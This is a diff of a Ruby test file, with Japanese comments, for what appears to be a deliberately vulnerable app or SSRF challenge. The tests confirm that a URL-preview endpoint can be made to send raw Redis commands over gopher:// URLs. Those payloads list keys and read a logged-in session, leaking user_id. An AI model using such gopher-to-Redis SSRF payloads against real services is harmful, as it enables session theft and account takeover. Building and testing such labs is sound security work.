@@ -76,55 +76,33 @@ class SsrfTest < ActiveSupport::TestCase
     result = create_task_via_form(@vuln_server, title: "session leak test")
     cookie = result[:cookie]
     task_id = result[:id]
-    
+
     # Cookie からセッションIDを抽出 (_session_id=...)
     session_id = cookie.match(/_session_id=([^;]+)/)&.captures&.first
     assert session_id.present?, "セッションIDが取得できるはず"
 
-    # 2) SSRF で KEYS * を実行し、セッションキーを探す
     res_show = @vuln_server.get("/tasks/#{task_id}", headers: { "Cookie" => cookie })
     csrf_token = extract_csrf_token(res_show.body)
 
-    keys_url = "gopher://redis:6379/_KEYS%20%2A%0D%0A"
-    res_keys = @vuln_server.post(
+    # このテスト自身のセッションだけを取得し、Redis の残存データに依存させない。
+    key = "_session_id:#{Rack::Session::SessionId.new(session_id).private_id}"
+    get_url = "gopher://redis:6379/_GET%20#{ERB::Util.url_encode(key)}%0D%0A"
+    res_get = @vuln_server.post(
       "/tasks/#{task_id}/preview_url",
-      body: URI.encode_www_form("authenticity_token" => csrf_token, "url" => keys_url),
+      body: URI.encode_www_form("authenticity_token" => csrf_token, "url" => get_url),
       headers: { "Cookie" => cookie }
     )
 
-    keys_body = JSON.parse(res_keys.body)["body"]
-    # Redis のレスポンスからセッションキーをすべて抽出
-    all_session_keys = keys_body.scan(/(_session_id:[^\\\r\n\s]+)/).flatten
-    assert all_session_keys.any?, "Redis 内にセッションキーが存在するはず"
+    assert_equal "200", res_get.code
+    fetched_body = JSON.parse(res_get.body).fetch("body")
+    assert_includes fetched_body, "user_id", "このテストのログイン済みセッションが漏洩するはず"
+  end
 
-    # 3) 各キーを GET で取得し、ログイン済みセッションを探す
-    found_leaked_data = false
-    all_session_keys.each do |key|
-      encoded_key = ERB::Util.url_encode(key)
-      get_url = "gopher://redis:6379/_GET%20#{encoded_key}%0D%0A"
-      res_get = @vuln_server.post(
-        "/tasks/#{task_id}/preview_url",
-        body: URI.encode_www_form("authenticity_token" => csrf_token, "url" => get_url),
-        headers: { "Cookie" => cookie }
-      )
-
-      fetched_body = JSON.parse(res_get.body)["body"]
-      # Marshall 形式のデータ内に user_id か _csrf_token が含まれているか確認
-      if fetched_body =~ /user_id|_csrf_token/i
-        found_leaked_data = true
-        break
-      end
-    end
-
-    assert found_leaked_data, "リークしたデータにセッション情報 (user_id 等) が含まれるはず"
-    end
-
-    test "VULN: allows saving non-HTTP URL (like gopher://) to task model" do
+  test "VULN: allows saving non-HTTP URL (like gopher://) to task model" do
     # SSRF チャレンジが有効な場合、攻撃者が UI から攻撃用 URL を保存できる必要がある
     gopher_url = "gopher://redis:6379/_PING"
     result = create_task_via_form(@vuln_server, title: "gopher save test", url: gopher_url)
 
-    assert_not_nil result[:id], "SSRF チャレンジ中であれば、gopher:// URL でも保存できるはず (Redで失敗予定)"
-    end
-    end
-
+    assert_not_nil result[:id], "SSRF チャレンジ中であれば、gopher:// URL でも保存できるはず"
+  end
+end
